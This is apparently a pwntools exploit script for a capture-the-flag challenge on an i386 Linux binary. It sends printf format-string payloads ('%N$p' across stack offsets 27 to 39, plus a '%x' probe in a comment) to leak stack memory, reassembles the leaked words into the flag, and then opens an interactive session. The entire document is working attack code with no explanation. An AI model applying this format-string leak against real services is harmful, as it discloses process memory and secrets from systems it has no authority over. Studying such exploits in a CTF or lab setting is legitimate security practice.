from parse_args_and_some_func import *
sh:tube = all_parsed_args.io
context.update(arch="i386", os='linux', endian="little")

sh.recvuntil("See if you can get the flag!\n")
# aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
res = b""
for x in range(27, 40):
    sh.sendlineafter("> ", "%{}$p".format(x))
    msg = sh.recvline()
    msg = int16(msg.decode())
    res += p32(msg)
    # print(p32(msg))
    time.sleep(1)
    if b"}" in res:
        break

print(res)

sh.interactive()